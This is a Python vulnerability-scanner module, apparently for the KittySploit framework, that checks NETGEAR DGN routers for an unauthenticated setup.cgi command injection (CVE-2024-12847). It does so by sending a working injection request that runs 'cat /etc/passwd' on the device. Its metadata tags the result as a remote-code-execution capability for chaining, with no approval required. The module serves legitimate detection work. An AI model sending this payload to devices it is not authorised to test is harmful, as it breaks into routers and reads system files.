#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR DGN setup.cgi syscmd RCE (CVE-2024-12847 / 2013 disclosure)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR DGN - setup.cgi syscmd Detection (CVE-2024-12847)',
        'description': (
            'Detects unauthenticated setup.cgi?todo=syscmd command injection by '
            'reading /etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'netgear', 'dgn', 'rce', 'cmdi', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-12847',
        ],
        'cve': 'CVE-2024-12847',
    }

    def run(self):
        path = (
            '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/etc/passwd'
            '&curpath=/&currentsetting.htm=1'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='NETGEAR DGN setup.cgi syscmd (CVE-2024-12847)',
                path='/setup.cgi',
            )
            return True
        return False
